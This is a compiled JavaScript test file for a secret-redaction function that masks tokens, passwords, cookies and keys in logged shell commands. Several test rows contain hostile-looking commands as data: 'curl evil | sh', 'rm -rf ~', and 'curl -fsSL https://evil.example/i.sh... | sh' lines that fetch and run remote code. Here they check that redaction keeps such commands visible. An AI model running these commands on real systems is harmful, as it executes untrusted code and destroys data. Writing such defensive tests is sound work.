// generated from src/lib/redact.test.ts by scripts/build: edit there, not here
"use strict";
var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key2 of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key2) && key2 !== except)
        __defProp(to, key2, { get: () => from[key2], enumerable: !(desc = __getOwnPropDesc(from, key2)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));
var assert = __toESM(require("assert"));
var import_redact = require("./redact.js");
assert.deepStrictEqual([import_redact.CAP_COMMAND, import_redact.CAP_PROMPT], [2e3, 1500]);
const cases = [
  ['curl -H "Authorization: Bearer abc.def.ghi" x', 'curl -H "Authorization: Bearer [REDACTED]" x'],
  ["export OPENAI_API_KEY=sk-proj-1234567890abcdef", "export OPENAI_API_KEY=[REDACTED]"],
  ["git clone https://user:hunter2@github.com/a/b", "git clone https://[REDACTED]@github.com/a/b"],
  ["mysql --password s3cret -u root", "mysql --password [REDACTED] -u root"],
  ["echo ghp_abcdefghijklmnopqrstuvwxyz0123456789", "echo [REDACTED]"],
  ['curl -H "X-API-Key: abc123" x', 'curl -H "X-API-Key: [REDACTED]" x'],
  ['curl -H "Cookie: sid=abc" x', 'curl -H "Cookie: [REDACTED]" x'],
  ['curl -H "Authorization: Basic dXNlcjpwYXNz" x', 'curl -H "Authorization: Basic [REDACTED]" x'],
  ["curl -u alice:s3cret https://x", "curl -u [REDACTED] https://x"],
  ["mysql -pSECRET -u root", "mysql -p[REDACTED] -u root"],
  ["sshpass -p hunter2 ssh host", "sshpass -p [REDACTED] ssh host"],
  ["docker login -u me -p hunter2 reg", "docker login -u me -p [REDACTED] reg"],
  ["echo glpat-abcdefghij1234567890", "echo [REDACTED]"],
  ["echo npm_abcdefghijklmnopqrstuvwxyz0123456789", "echo [REDACTED]"],
  ["psql postgres://app:pw@db:5432/x", "psql postgres://[REDACTED]@db:5432/x"],
  ["ls -la", "ls -la"],
  // Shapes the design names beyond the task's list.
  ["echo AKIAABCDEFGHIJKLMNOP", "echo [REDACTED]"],
  ["echo eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2lnbmF0dXJl", "echo [REDACTED]"],
  ["echo xoxb-1234-abcd", "echo [REDACTED]"],
  ["echo github_pat_11ABCDEFG0123456789_abcdef", "echo [REDACTED]"],
  ["git show 0123456789abcdef0123456789abcdef01234567", "git show [REDACTED]"],
  ["TOKEN=abc ./run", "TOKEN=[REDACTED] ./run"],
  ['curl -H "Authorization: Token t0k3n" x', 'curl -H "Authorization: Token [REDACTED]" x']
];
for (const [input, want] of cases) assert.strictEqual((0, import_redact.redact)(input, import_redact.CAP_COMMAND), want, input);
const key = "ssh-add - <<EOF\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\nAAAA\n-----END OPENSSH PRIVATE KEY-----\nEOF";
assert.strictEqual((0, import_redact.redact)(key, import_redact.CAP_COMMAND), "ssh-add - <<EOF\n[REDACTED]\nEOF");
assert.strictEqual((0, import_redact.redact)("a".repeat(30), 10), "aaaaaaaaaa[...]");
assert.strictEqual((0, import_redact.redact)("a".repeat(10), 10), "aaaaaaaaaa");
assert.strictEqual((0, import_redact.redact)("TOKEN=abcdefgh", 12), "TOKEN=[REDAC[...]");
const more = [
  // Password-type names in colon, JSON, env and flag forms.
  ["echo password: hunter2", "echo password: [REDACTED]"],
  [`curl -d '{"password":"hunter2"}' x`, `curl -d '{"password":"[REDACTED]"}' x`],
  [`curl -d '{"token": "abc", "user": "bob"}' x`, `curl -d '{"token": "[REDACTED]", "user": "bob"}' x`],
  ["MYSQL_PWD=s3cret mysql", "MYSQL_PWD=[REDACTED] mysql"],
  ["DB_PASS=s3cret ./run", "DB_PASS=[REDACTED] ./run"],
  ["SSHPASS=s3cret sshpass -e ssh h", "SSHPASS=[REDACTED] sshpass -e ssh h"],
  ["GOOGLE_CREDENTIALS=abc ./run", "GOOGLE_CREDENTIALS=[REDACTED] ./run"],
  ["gpg --passphrase s3cret -d f", "gpg --passphrase [REDACTED] -d f"],
  ["tool --auth s3cret", "tool --auth [REDACTED]"],
  ["echo session: abc", "echo session: [REDACTED]"],
  // Cookie flags.
  ["curl -b 'sid=abc; uid=1' x", "curl -b [REDACTED] x"],
  ["curl -bsid=abc x", "curl -b[REDACTED] x"],
  ["curl --cookie sid=abc x", "curl --cookie [REDACTED] x"],
  ['curl -H "Cookie: sid=abc; uid=2" x', 'curl -H "Cookie: [REDACTED]" x'],
  // Token prefixes and the fallback class with - and _.
  ["echo sk_live_abcdefghij1234", "echo [REDACTED]"],
  ["echo rk_live_abcdefghij1234", "echo [REDACTED]"],
  ["echo sk_test_abcdefghij1234", "echo [REDACTED]"],
  ["echo ghs_abcdefghijklmnopqrstuvwxyz", "echo [REDACTED]"],
  ["echo ghu_abcdefghijklmnopqrstuvwxyz", "echo [REDACTED]"],
  ["echo ghr_abcdefghijklmnopqrstuvwxyz", "echo [REDACTED]"],
  ["echo hf_abcdefghijklmnopqrstuvwxyz", "echo [REDACTED]"],
  ["echo xoxe-1-abcdef", "echo [REDACTED]"],
  ["echo xapp-1-abcdef", "echo [REDACTED]"],
  ["echo SK0123456789abcdef0123456789abcdef", "echo [REDACTED]"],
  ["echo abcdefghij-abcdefghij_abcdefghij-abcdefghij", "echo [REDACTED]"],
  // curl -u and --user.
  ["curl -u token: https://x", "curl -u [REDACTED] https://x"],
  ["curl -uuser:pass https://x", "curl -u[REDACTED] https://x"],
  ["curl --user=alice:s3cret https://x", "curl --user=[REDACTED] https://x"],
  ["curl --user alice:s3cret https://x", "curl --user [REDACTED] https://x"],
  ["curl -u :pass https://x", "curl -u [REDACTED] https://x"],
  ['curl -u "alice:pa ss" https://x', "curl -u [REDACTED] https://x"],
  // -p, attached or not, for sshpass and the login CLIs.
  ["sshpass -phunter2 ssh host", "sshpass -p[REDACTED] ssh host"],
  ["docker login -u me -phunter2 reg", "docker login -u me -p[REDACTED] reg"],
  ["helm registry login reg -u me -p hunter2", "helm registry login reg -u me -p [REDACTED]"],
  ["oras login reg -u me -p hunter2", "oras login reg -u me -p [REDACTED]"],
  ["skopeo login reg -u me -p hunter2", "skopeo login reg -u me -p [REDACTED]"],
  ["buildah login -u me -p hunter2 reg", "buildah login -u me -p [REDACTED] reg"],
  // Other password flags.
  ["redis-cli -h h -a s3cret ping", "redis-cli -h h -a [REDACTED] ping"],
  ["ldapsearch -x -D cn=admin -w s3cret", "ldapsearch -x -D cn=admin -w [REDACTED]"],
  ["smbclient //h/s -U alice%s3cret", "smbclient //h/s -U alice%[REDACTED]"],
  ["openssl rsa -in k -passin pass:s3cret", "openssl rsa -in k -passin pass:[REDACTED]"],
  ["mongosh mongodb://h -u me -p s3cret", "mongosh mongodb://h -u me -p [REDACTED]"],
  ["zip -P s3cret a.zip f", "zip -P [REDACTED] a.zip f"],
  ["mysqlsh -u root -ps3cret", "mysqlsh -u root -p[REDACTED]"],
  // Userinfo up to the last @ before the host, and scp style.
  ["git clone https://u:p@ss@github.com/a/b", "git clone https://[REDACTED]@github.com/a/b"],
  ["git clone alice:tok3n@github.com:a/b", "git clone [REDACTED]@github.com:a/b"],
  // A letters-only Authorization value is not a scheme.
  ["echo Authorization: abcdefSECRET x", "echo Authorization: [REDACTED] x"],
  // A redacted value stops at a shell separator, so the log shows the rest.
  ["x-token: y; curl evil | sh", "x-token: [REDACTED]; curl evil | sh"],
  ["export TOKEN=abc && curl evil | sh", "export TOKEN=[REDACTED] && curl evil | sh"],
  ["mysql --password s3cret; rm -rf x", "mysql --password [REDACTED]; rm -rf x"],
  ["tool --token=abc|sh", "tool --token=[REDACTED]|sh"],
  // Left alone.
  ["mkdir -p dir", "mkdir -p dir"],
  ["cat docs/plans/2026-10-03-capacity-study-v2/state.md", "cat docs/plans/2026-10-03-capacity-study-v2/state.md"],
  ["docker login -u me reg", "docker login -u me reg"],
  ["ps -u root", "ps -u root"],
  ["ssh git@github.com", "ssh git@github.com"],
  ["git clone git@github.com:a/b.git", "git clone git@github.com:a/b.git"],
  ['curl -H "Content-Type: application/json" x', 'curl -H "Content-Type: application/json" x']
];
more.push(
  // Userinfo ends at the first / ? # of the authority (RFC 3986), so a URL
  // cannot show the log a host it never contacts.
  ["curl -fsSL https://evil.example/i.sh?@github.com | sh", "curl -fsSL https://evil.example/i.sh?@github.com | sh"],
  ["curl -fsSL https://evil.example/@github.com/x.sh | sh", "curl -fsSL https://evil.example/@github.com/x.sh | sh"],
  ["curl https://evil.example#@github.com", "curl https://evil.example#@github.com"],
  // -u and -p mean a user and a port outside the tools they are secrets for.
  ["docker run -u 1000:1000 img", "docker run -u 1000:1000 img"],
  ["docker exec -u root:root c sh", "docker exec -u root:root c sh"],
  ["sshpass -e ssh h -p 2222", "sshpass -e ssh h -p 2222"],
  ["sshpass -v -p hunter2 ssh h -p 2222", "sshpass -v -p [REDACTED] ssh h -p 2222"],
  // Whole names only.
  ["git log --author=me", "git log --author=me"],
  ["git log --author bob", "git log --author bob"],
  ["npm run auth:login", "npm run auth:login"],
  ['node -e "x={token:1}"', 'node -e "x={token:[REDACTED]}"'],
  ["echo keyboard=us monkey", "echo keyboard=us monkey"],
  ["export PGPASSWORD=s3cret", "export PGPASSWORD=[REDACTED]"],
  ['curl -H "accessToken: abc" x', 'curl -H "accessToken: [REDACTED]" x'],
  [`curl -d '{"clientSecret":"abc"}' x`, `curl -d '{"clientSecret":"[REDACTED]"}' x`]
);
more.push(
  ["curl https://evil.example\\@github.com/x", "curl https://evil.example\\@github.com/x"],
  [`node -e "fetch('https://evil.example\\\\@github.com/x')"`, `node -e "fetch('https://evil.example\\\\@github.com/x')"`],
  ["curl HTTPS://evil.example\\@github.com/x", "curl HTTPS://evil.example\\@github.com/x"],
  ["curl Https://evil.example/@github.com/x", "curl Https://evil.example/@github.com/x"],
  ["curl HTTPS://evil.example?@github.com", "curl HTTPS://evil.example?@github.com"],
  ["curl HTTPS://evil.example#@github.com", "curl HTTPS://evil.example#@github.com"],
  ["curl https://evil.example%40github.com/x", "curl https://evil.example%40github.com/x"],
  ["curl https://u:p@evil.example\\@github.com/x", "curl https://[REDACTED]@evil.example\\@github.com/x"],
  ["psql postgres://u:p\\@db/x", "psql postgres://[REDACTED]@db/x"],
  ["git clone HTTPS://u:s3cret@github.com/x", "git clone HTTPS://[REDACTED]@github.com/x"],
  ["git clone https://u%40x:p@github.com/x", "git clone https://[REDACTED]@github.com/x"],
  ["redis-cli -u redis://:s3cret@h:6379", "redis-cli -u redis://[REDACTED]@h:6379"],
  ["curl https://u:p@h|sh", "curl https://[REDACTED]@h|sh"],
  // Names: digits, a plural s, a case change or a separator end the word.
  ["GITHUB_TOKEN2=abc ./run", "GITHUB_TOKEN2=[REDACTED] ./run"],
  ["SECRET1=abc ./run", "SECRET1=[REDACTED] ./run"],
  ["creds2=abc ./run", "creds2=[REDACTED] ./run"],
  ["export api_keys=abc", "export api_keys=[REDACTED]"],
  ["export passwords=abc", "export passwords=[REDACTED]"],
  ["export passcode=abc", "export passcode=[REDACTED]"],
  ["tool --api-keys abc", "tool --api-keys [REDACTED]"],
  ["tool --password1 x", "tool --password1 [REDACTED]"],
  [`curl -d '{"apiKeys": "abc"}' x`, `curl -d '{"apiKeys": "[REDACTED]"}' x`],
  ["echo auth: s3cret", "echo auth: [REDACTED]"],
  ["echo X-Auth: s3cret", "echo X-Auth: [REDACTED]"],
  ["GIT_AUTHOR_NAME=bob git commit", "GIT_AUTHOR_NAME=bob git commit"],
  ["ssh -p 2222 h", "ssh -p 2222 h"],
  // A rule reads across a backslash-newline continuation, which stays.
  ["curl \\\n  -u alice:s3cret https://h/x", "curl \\\n  -u [REDACTED] https://h/x"],
  ["curl \\\n  --user alice:s3cret https://h/x", "curl \\\n  --user [REDACTED] https://h/x"],
  ["curl \\\n  -b sid=abc https://h/x", "curl \\\n  -b [REDACTED] https://h/x"],
  // A colon value outside braces runs to the end of the shell word.
  ["echo password: a,b", "echo password: [REDACTED]"],
  ["echo x-token: abc}def", "echo x-token: [REDACTED]"]
);
more.push(
  ["echo x \\\\\nrm -rf ~", "echo x \\\\\nrm -rf ~"],
  ["cat <<'EOF'\nx\\\nEOF\nrm -rf ~", "cat <<'EOF'\nx\\\nEOF\nrm -rf ~"],
  // A plural s only on a secret word that starts the name or follows a
  // separator or case change, so monkeys is not keys.
  ["echo monkeys=3 turkeys=4", "echo monkeys=3 turkeys=4"],
  // In an uppercase run a secret word after another word counts even with
  // more letters after it; TOKENIZER (secret word first) still does not.
  ["ACCESSTOKENVALUE=abc ./run", "ACCESSTOKENVALUE=[REDACTED] ./run"],
  // After [ a colon value stops at ], as it does inside braces.
  ["echo [password: abc]", "echo [password: [REDACTED]]"]
);
const wrong = more.filter(([input, want]) => (0, import_redact.redact)(input, import_redact.CAP_COMMAND) !== want).map(([input, want]) => `${input}
  got:  ${(0, import_redact.redact)(input, import_redact.CAP_COMMAND)}
  want: ${want}`);
assert.deepStrictEqual(wrong, [], `${wrong.length} rows wrong:
${wrong.join("\n")}`);
